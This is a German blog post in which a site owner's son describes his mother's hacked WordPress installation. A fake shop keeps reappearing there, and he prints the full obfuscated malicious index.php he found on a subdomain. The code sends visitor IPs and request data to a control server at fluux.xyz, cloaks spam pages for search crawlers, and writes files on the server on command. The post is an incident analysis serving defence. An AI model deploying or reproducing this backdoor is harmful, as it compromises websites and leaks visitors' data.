---
title: "Wordpress Hack"
date: 2021-08-01T19:30:00+02:00
draft: false
author: "Marius Timmer"
keywords: ["Wordpress", "Hack", "Hetzner", "PHP"]
description: "as"
---

Hin und wieder helfe ich einigen Leuten in meinem Umfeld beim Aufsetzen und Warten ihrer Internetseiten. So gucke ich immer wieder mal über die WordPress-Installation meiner Mutter und stelle sicher, dass sie auch ja alle Updates installiert hat. Einigen von euch stellen sich die Nackenhaare beim Namen Wordpress wahrscheinlich schon auf (_so geht es mir auch immer wieder_), aber am Ende bin ich da nur die ausführende Kraft. Um das einmal klar zu stellen: WordPress ist ein einziges Sicherheitsrisiko. Das verwundert natürlich nicht, wenn man bedenkt, wie weit verbreitet die Software ist. Sieht man aber einmal in den Code erkennt man, dass es bei der Entwicklung kein wirkliches Konzept gegeben hat oder es maximal versucht wurde nachträglich einzubauen. Da es sich aber mit seinen ganzen Erweiterungen um ein Gemeinschafts-Projekt handelt, ist es natürlich auch gar nicht so einfach, einheitlichen und guten Code zu schreiben. Abe rich wäre ja schon zufrieden, wenn die Datenbank-Verbindung nicht in einer globalen Variabel von überall aufzurufen wäre.

Der Fake-Shop
-------------
Anfang des Jahres meldete sich dann meine Mutter bei mir, da sich jemand bei ihr erkundigt hatte, wie der Status einer bestimmten Bestellung sei. Er habe ein Ersatzteil für seine Modell-Eisenbahn bestellt, bisher aber noch keine Reaktion erhalten. An dieser Stelle ist zu erwähnen, dass meine Mutter keinen Shop führt, sondern Fortbildungen anbietet.

Sehr schnell meldete sie sich also bei mir und bat mich um Hilfe. In der Tat war da ein Shop auf ihrer Seite, den keiner da hin gespielt hatte. Er sah auch wirklich nicht gut aus, da einzelne Fragmente (_Bilder, Preise, Beschreibungen_) einfach in die schon existierende Seite meiner Mutter eingebettet wurden. Wer darauf rein fällt, bettelt förmlich auch darum. Allerdings ist das natürlich dennoch ein großes Problem. Schließlich ist da ein Shop von irgendwelchen Betrügern auf der Seite meiner Mutter, die somit auch dafür (_juristisch_) verantwortlich ist.

Ich fand heraus, welche Dateien betroffen waren. Es existierte ein Verzeichnis (_`designthemes`_), welches ich einfach löschen musste. Zudem wurde die `.htaccess`-Datei modifiziert, so dass Gäste auf die Seiten im besagten Verzeichnis geleitet wurden. Der Säuberungsprozess selbst ging also recht schnell. Einen Tag später wurde ich aber wieder informiert, dass der Shop zurück sei. Das wunderte mich tatsächlich, beantwortete mir aber die Frage aller Fragen: Wie ist der Shop da hin gekommen?

Die erste Reaktion bei solchen "_Einbrüchen_" ist natürlich erst einmal der Austausch sämtlicher Passwörter. Um so erstaunter war ich dann aber, als ich hörte, dass der Shop zurück sei. Ich schloss somit nun aber aus, dass jemand die FTP-Zugangsdaten herausgefunden hat und sah mir die WordPress-Installation meiner Mutter noch einmal näher an. Tatsächlich fand ich ein kompromitiertes PHP-Skript und ein als gif-Datei getarntes Skript, welche beim Aufruf durch Nutzer immer wieder angestoßen wurde und unter Anderem den Shop wieder holte.

Bisher hatte ich noch nicht die Zeit gefunden, mir das Problem genauer anzusehen. Wenn ich aber schon nicht die Ursache nicht so schnell finden konnte, wollte ich zumindest die Symptome bekämpfen. Schließlich war meine Mutter hier rechtlich angreifbar und auch ihre Google-Platzierung litt natürlich darunter.
Was ich also machte, war ein kleines Skript zu schreiben, welches sich alle 5 Minuten per FTP mit dem Server verbindet und prüft ob das mysteriöse Verzeichnis existiert. Wenn es gefunden wird, wird es direkt gelöscht und die `.htaccess` wiederhergestellt. Das ist natürlich keine Dauerlösung, aber die hereinzufallenden Besucher erhielten beim Klick auf die immer weiter sinkenden Google-Ergebnisse nur noch <abbr title="Seite nicht gefunden">404</abbr>-Seiten, womit das gröbste Problem schon einmal gelöst war.

Nun geht das schon einige Monate so, ich weiß aber noch immer nicht, wo der Shop immer wieder her kommt. Die besagten beiden Skripte habe ich mehrfach gelöscht und an anderen Stellen konnte ich keine Hinweise auf weitere mysteriöse Dateien feststellen. Zumindest hatte ich einmal den gesamten Dateibaum heruntergeladen und durchsucht. Daher werde ich mir nun wohl den Code genauer ansehen. Ich sehe es als eine Art Schnitzeljagd mit PHP-Code.

Die Subdomain
-------------
Seit letzter Woche betreibt meine Mutter eine weitere WordPress-Instanz auf einer Subdomain. Von einem auf den anderen Tag war diese nicht mehr zu erreichen. Daher bat sie mich wieder um Hilfe. Zwei Stunden lang sah ich mir diverse Hetzner-Konfigurationen an und suchte den Grund, wieso die Subdomain nicht lief. Viel zu spät bemerkte ich erst, dass die Subdomain ansich funktionierte, allerdings gab das WordPress nur eine leere Antwort zurück.

Zuerst verdächtigte ich sämtliche WordPress-Erweiterungen irgendeinen Unfug zu treiben, zumal es eine Fehlermeldung in den Protokollen bezüglich veralteter Funktionsaufrufe gab. Dann sah ich mir aber _aus einer Laune heraus_ einfach mal die `index.php` an und sah, dass sie ganz merkwürdig aussah. Ganz viel "_Security by obscurity_" war da drin, was ich im Folgenden zeigen möchte.

Zuerst wird die Fehlerausgabe deaktiviert, weswegen meine Versuche mit der Apache-Konfiguration Fehlermeldungen auszugeben alle scheiterten. Anschließend werden merkwürdig benannte Strings definiert, die im Anschluss mit verschiedenen Offsets ausgelesen werden, woraus sich z.B. auch der Hostname des Control-Servers ergibt.
```php
//CX3_CX4
error_reporting(0);
header('Content-Type: text/html; charset=utf-8');
$OoooOO0 = 'czhnientytwoj';
$OOOOOO = "%71%77%65%72%74%79%75%69%6f%70%61%73%64%66%67%68%6a%6b%6c%7a%78%63%76%62%6e%6d%51%57%45%52%54%59%55%49%4f%50%41%53%44%46%47%48%4a%4b%4c%5a%58%43%56%42%4e%4d%5f%2d%22%3f%3e%20%3c%2e%2d%3d%3a%2f%31%32%33%30%36%35%34%38%37%39%27%3b%28%29%26%5e%24%5b%5d%5c%5c%25%7b%7d%21%2a";
$O = urldecode($OOOOOO);
```

Ganz grob lässt sich sagen, dass das Skript sämtliche Server-Umgebungsvariablen und Nutzerdaten (_IP-Adresse etc._) an einen Server weiter gibt.
```php
date_default_timezone_set('PRC');
$dRoot = @$_SERVER['DOCUMENT_ROOT'];
$rUrl = @$_SERVER['REQUEST_URI'];
$sName = @$_SERVER['HTTP_HOST'];
$Ooolg = @$_SERVER['HTTP_ACCEPT_LANGUAGE'];
$uAgent = @$_SERVER['HTTP_USER_AGENT'];
$referer = @$_SERVER['HTTP_REFERER'];
$http_type = ((isset($_SERVER['HTTPS']) && $_SERVER['HTTPS'] == 'on') || (isset($_SERVER['HTTP_X_FORWARDED_PROTO']) && $_SERVER['HTTP_X_FORWARDED_PROTO'] == 'https')) ? 'https://' : 'http://';
$typeName = $http_type . $sName;
$uAgent = @strtolower($uAgent);
$referer = @strtolower($referer);
if (getenv('HTTP_CLIENT_IP')) {
    $client_ip = getenv('HTTP_CLIENT_IP');
} elseif (getenv('HTTP_X_FORWARDED_FOR')) {
    $client_ip = getenv('HTTP_X_FORWARDED_FOR');
} elseif (getenv('REMOTE_ADDR')) {
    $client_ip = getenv('REMOTE_ADDR');
} else {
    $client_ip = $_SERVER['REMOTE_ADDR'];
}
if (isset($_GET['vf']) && $_GET['vf'] == 'online5566') {
    echo 'domain online!';
    exit;
}

if (strstr($rUrl, 'sitemap_index_')) {
    $pr = dirname($rUrl);
    allmap($O, $OoooOO0, $typeName, $rUrl, $sName, $http_type, $pr);
}
if (strstr($rUrl, '.xml')) {
    $pr = dirname($rUrl);
    sitefun($O, $OoooOO0, $typeName, $rUrl, $http_type, $sName, $client_ip, $pr);
}
function allmap($O, $OoooOO0, $typeName, $rUrl, $sName, $http_type, $pr)
{
    $ol = 'http://' . $OoooOO0 . '.fluux.xyz/Api/siteAllMap.php?page=' . $rUrl . '&pwd=sl123&domain=' . $typeName;
    if ($_GET['vf_allmap'] == 'online5566') {
        echo $ol;
        exit;
    }
    $getRes = json_decode(getCurl($O, $ol), true);
    if (empty($getRes) || $getRes['code'] == 404) {
        header('HTTP/1.0 404 Not Found');
        header('Status: 404 Not Found');
        exit();
    }
    if (empty($getRes) || $getRes['code'] == 444) {
        header('HTTP/1.0 404 Not Found');
        header('Status: 404 Not Found');
        exit();
    }
    $getsResult = $getRes['data'];
    header('Content-type:text/xml');
    echo $getsResult;
    exit();
}

function sitefun($O, $OoooOO0, $typeName, $rUrl, $http_type, $sName, $client_ip, $pr = '', $qs = '')
{
    $ol = 'http://' . $OoooOO0 . '.fluux.xyz/Api/siteUrlApi.php?stype=sitemap&num=6000&pr=' . $pr . '&url=' . $rUrl . '&domain=' . $typeName . '&ip=' . $client_ip;
    if ($_GET['vf_map'] == 'online5566') {
        echo $ol;
        exit;
    }
    $getRes = json_decode(getCurl($O, $ol), true);
    if (isset($getRes['code']) && $getRes['code'] == '600') {
        $getsResult = $getRes['data'];
        foreach ($getsResult as $Oog => $Oov) {
            $pingRes = getCurl($O, $Oov);
            $Oooo0s = (strpos($pingRes, 'Sitemap Notification Received') !== false) ? 'OK' : 'ERROR';
            echo $Oov . '===>Submitting Google Sitemap: ' . $Oooo0s . PHP_EOL;
        }
        exit();
    }
    if (isset($getRes['code']) && $getRes['code'] == '406') {
        echo 'Submitting Google Sitemap Return Fail';
        exit();
    }
    if (empty($getRes) || $getRes['code'] == 404) {
        header('HTTP/1.0 404 Not Found');
        header('Status: 404 Not Found');
        exit();
    }
    $getsResult = $getRes['data'];
    header('Content-type:text/xml');
    echo $getsResult;
    exit();
}

if (isset($_GET['google'])) {
    $go = $_GET['google'];
    if (preg_match('/^google.*?(\.html)$/i', $go)) {
        putFile($O, $go, 'google-site-verification:' . ' ' . $go);
        exit('<a href=' . $go . '>' . $go . '</a>');
    }
}
if (isset($_GET['robots'])) {
    $robots = $_GET['robots'];
    if (preg_match('/(\.php)$/i', $robots)) {
        $typeName = $typeName . '/' . $robots . '?';
    } else {
        $typeName = $typeName . '/';
    }
    putFile($O, 'robots.txt', 'User-agent: *' . PHP_EOL . 'Allow: /' . PHP_EOL . 'Crawl-delay:3' . PHP_EOL . 'Sitemap:' . $typeName . 'sitemap_index_1.xml' . PHP_EOL . 'Sitemap:' . $typeName . 'sitemap_index_2.xml' . PHP_EOL . 'Sitemap:' . $typeName . 'sitemap_index_3.xml' . PHP_EOL . 'Sitemap:' . $typeName . 'sitemap_index_4.xml' . PHP_EOL . 'Sitemap:' . $typeName . 'sitemap_index_5.xml' . PHP_EOL . 'Sitemap:' . $typeName . 'sitemap_index_6.xml' . PHP_EOL . 'Sitemap:' . $typeName . 'sitemap_index_7.xml' . PHP_EOL . 'Sitemap:' . $typeName . 'sitemap_index_8.xml');
    $file_get_contents = file_get_contents('robots.txt');
    echo $file_get_contents;
    exit();
}
if (preg_match('/google.co.jp|yahoo|google\.com[^.]*?$|bing/i', $referer)) {
    if ($_GET['vf_jump'] == 'online5566') {
        echo 'http://' . $OoooOO0 . '.fluux.xyz/jump.php?domain=' . $sName . '&page=' . $rUrl . '&bot=0&pr=' . $pr . '&refer=' . $referer . '&ip=' . $client_ip . '&lg=' . $Ooolg;
        exit;
    }
    $jumpRes = getCurl($O, 'http://' . $OoooOO0 . '.fluux.xyz/jump.php?domain=' . $sName . '&page=' . $rUrl . '&bot=0&pr=' . $pr . '&refer=' . $referer . '&ip=' . $client_ip . '&lg=' . $Ooolg);
    if ($jumpRes) {
        echo $jumpRes;
        exit();
    }
}
if (stristr($uAgent, 'googlebot') || stristr($uAgent, 'bing') || stristr($uAgent, 'Y!J') || stristr($uAgent, 'y!j') || stristr($uAgent, 'yahoo') || stristr($uAgent, 'google') || stristr($uAgent, 'Googlebot') || stristr($uAgent, 'googlebot')) {
    if ($_GET['vf_bot'] == 'online5566') {
        echo 'http://' . $OoooOO0 . '.fluux.xyz/918.php?domain=' . $sName . '&page=' . $rUrl . '&bot=1&pr=' . $pr . '&ip=' . $client_ip . '&lg=' . $Ooolg;
        exit;
    }
    $file_contents = getCurl($O, 'http://' . $OoooOO0 . '.fluux.xyz/918.php?domain=' . $sName . '&page=' . $rUrl . '&bot=1&pr=' . $pr . '&ip=' . $client_ip . '&lg=' . $Ooolg);
    if (!empty($file_contents)) {
        $getRes = json_decode($file_contents, true);
        if ($getRes['code'] == 404) {
            header('HTTP/1.0 404 Not Found');
            header('Status: 404 Not Found');
            exit();
        }
        if ($getRes['code'] == 500) {
            header('HTTP/1.1 500 Internal Server Error');
            exit();
        }
        echo $file_contents;
        exit;
    }
}
if ($_GET['vf_origin'] == 'online5566') {
    echo 'http://' . $OoooOO0 . '.fluux.xyz/org.php?domain=' . $sName . '&page=' . $rUrl . '&pr=' . $pr . '&ip=' . $client_ip . '&lg=' . $Ooolg;
    exit;
}
getCurl($O, 'http://' . $OoooOO0 . '.fluux.xyz/org.php?domain=' . $sName . '&page=' . $rUrl . '&pr=' . $pr . '&ip=' . $client_ip . '&lg=' . $Ooolg);
function getCurl($O, $gurl)
{
    $file_contents = '';
    $user_agent = 'Mozilla/4.0 (compatible;MSIE 6.0;Windows NT 5.2;.NET CLR 1.1.4322)';
    if (function_exists('curl_init')) {
        try {
            $ch = curl_init();
            $timeout = 30;
            curl_setopt($ch, CURLOPT_URL, $gurl);
            curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
            curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
            curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
            curl_setopt($ch, CURLOPT_CONNECTTIMEOUT, $timeout);
            $file_contents = curl_exec($ch);
            curl_close($ch);
        } catch (Exception $e) {
        }
    }
    if (strlen($file_contents) < 1 && function_exists('file_get_contents')) {
        ini_set('user_agent', $user_agent);
        try {
            $file_contents = @file_get_contents($gurl);
        } catch (Exception $e) {
        }
    }
    return $file_contents;
}

function putFile($O, $htName, $htContents)
{
    $handle = fopen($htName, 'w') or die('0');
    fwrite($handle, $htContents);
    fclose($handle);
}

?>
```
